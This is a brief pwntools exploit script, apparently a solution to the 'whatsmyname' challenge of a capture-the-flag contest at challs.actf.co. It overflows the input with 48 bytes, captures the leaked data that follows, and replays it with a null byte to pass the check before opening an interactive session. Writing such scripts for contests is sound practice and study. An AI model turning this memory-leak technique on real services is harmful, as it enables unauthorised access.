from pwn import *

#p = proces("./whatsmyname")

p = remote('challs.actf.co', 31223)

p.send(b'A'*48)

p.recvuntil(b'A'*48)

leak = p.recvuntil(b'!\n',drop = True)

print("bytes_receive = ", leak)

leak = leak + b'\0' 
p.sendline(leak)

print(p.recv())

p.interactive()
